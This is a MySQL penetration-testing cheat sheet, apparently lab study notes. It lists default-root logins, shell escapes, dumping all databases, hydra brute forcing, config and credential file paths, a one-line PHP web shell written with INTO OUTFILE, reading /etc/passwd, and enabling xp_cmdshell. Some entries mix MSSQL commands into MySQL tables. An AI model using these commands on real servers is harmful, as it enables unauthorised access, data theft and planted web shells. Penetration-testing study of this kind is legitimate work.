# Nmap

```bash
sudo nmap $IP -sV -sC -p3306 --script mysql*
```

# Service Interaction

## mysql

### Local Access

```bash
mysql -u root 
# Connect to root without password

mysql -u root -p 
# A password will be asked

# Always test root:root credential
```

### Remote Access

```bash
mysql -h <Hostname> -u root

mysql -h <Hostname> -u root@localhost
```

### If running as root

```bash
mysql> select do_system('id');

mysql> \! sh
```

# Service Enumeration

## mysqldump

```bash
mysqldump -u user -p DBNAME
# inserire password

mysqldump -u admin -p admin --all-databases --skip-lock-tables 
```

# Brute Forcing

## hydra

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $IP mysql -v
```

# MySQL server configuration file, command history and log files

```bash
# Unix
/var/www/html/configuration.php
my.cnf
/etc/mysql
/etc/my.cnf
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
~/.my.cnf
/etc/my.cnf

# Windows
/var/www/html/configuration.php
config.ini
my.ini
windows\my.ini
winnt\my.ini
<InstDir>/mysql/data/

# Command History
~/.mysql.history

# Log Files
connections.log
update.log
common.log
```

---

| **MySQL Command**   | **Description**   |
| --------------|-------------------|
| `mysql -u <user> -p<password> -h <IP address>` | Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. |
| `show databases;` | Show all databases. |
| `use <database>;` | Select one of the existing databases. |
| `show tables;` | Show all available tables in the selected database. |
| `show columns from <table>;` | Show all columns in the selected database. |
| `select * from <table>;` | Show everything in the desired table. |
| `select * from <table> where <column> = "<string>";` | Search for needed string in the desired table. |

| **Command**                                                                                      | **Description**                                                                               |
| ------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------- |
| `mysql -u julio -pPassword123 -h 10.129.20.13`                                                   | Connecting to the MySQL server.                                                               |
| `mysql> SHOW DATABASES;`                                                                         | Show all available databases in MySQL.                                                        |
| `mysql> USE htbusers;`                                                                           | Select a specific database in MySQL.                                                          |
| `mysql> SHOW TABLES;`                                                                            | Show all available tables in the selected database in MySQL.                                  |
| `mysql> SELECT * FROM users;`                                                                    | Select all available entries from the "users" table in MySQL.                                 |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`                                        | To allow advanced options to be changed.                                                      |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`                                                  | To enable the xp_cmdshell.                                                                    |
| `sqlcmd> RECONFIGURE`                                                                            | To be used after each sp_configure command to apply the changes.                              |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL.                                                                    |
| `mysql> show variables like "secure_file_priv";`                                                 | Check if the the secure file privileges are empty to read locally stored files on the system. |
| `mysql> select LOAD_FILE("/etc/passwd");`                                                        | Read local files in MySQL.                                                                    |
